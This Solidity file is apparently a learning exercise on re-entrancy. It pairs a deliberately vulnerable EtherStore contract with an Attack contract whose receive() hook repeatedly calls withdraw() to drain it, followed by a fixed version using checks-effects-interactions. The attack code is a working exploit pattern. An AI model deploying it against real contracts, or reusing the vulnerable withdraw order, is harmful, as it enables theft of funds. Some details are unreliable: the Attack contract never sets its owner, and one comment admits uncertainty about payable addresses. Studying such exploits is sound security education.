// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

// VULNERABLE CONTRACT
contract EtherStore {
    mapping(address => uint256) public balances;

    // Recall that every transaction includes a "value" field (amount of wei sent).
    // Therefore, `deposit()` takes no arguments.
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Note: withdraw() does not have to be `payable`, because it is sending ETH,
    // not receiving ETH.
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        // Q: Why doesn't msg.sender have to be explicitly marked `payable` here?
        // A: Not sure. I think it has something to do with `call` lacking type safety.
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // Note: https://docs.soliditylang.org/en/latest/control-structures.html#destructuring-assignments-and-returning-multiple-values
        // .call() returns (bool success, bytes memory data). These will disappear
        // unless captured somewhere, which is what (`bool sent, )` does!

        // DANGER: `balances` updates only after sending the withdrawal.
        // Hence, a re-entrancy attack may be possible, as we will see.
        balances[msg.sender] = 0;
    }
}

// ATTACK
// In practice, the following usually lies in a separate contract on a separate address.
// Therefore, will require techniques to import/interface the other contract first.
// For now, we examine both contracts in the same file.

contract Attack {
    // Declares an EtherStore-typed variable. Because it's public, a getter will
    // be generated, which can be used to call functions.
    EtherStore public etherStore;

    // Somebody wants access to these funds ...
    address public owner;

    // When deploying the contract, a target address will have to be specified.
    // This will be the address of the original EtherStore contract.
    // The constructor assigns the address to the etherStore variable.
    // Note: If `EtherStore public etherStore` not declared earlier, assignment
    // would fail.
    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // First, deposits 1 ether in the etherStore, updating the Attack contract's balance.
    // Then, the first withdrawal will be possible.
    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // The core ingredient of reentrancy. After receiving ether from the first withdrawal,
    // send another withdraw().
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    // Required to withdraw funds.
    function withdraw() external {
        require(msg.sender == owner, "Must be the owner");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

// SAFER CONTRACT

contract etherStoreSafe {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // Better pattern: Checks-Effects-Interactions
    function withdraw() external {
        // Checks
        uint amount = balances[msg.sender];
        require(amount > 0, "Insufficient balance");

        // Effects: Update the user's balance before sending Ether
        balances[msg.sender] = 0;

        // Interactions: Then send Ether
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}

// Also consider reentrancy guards.
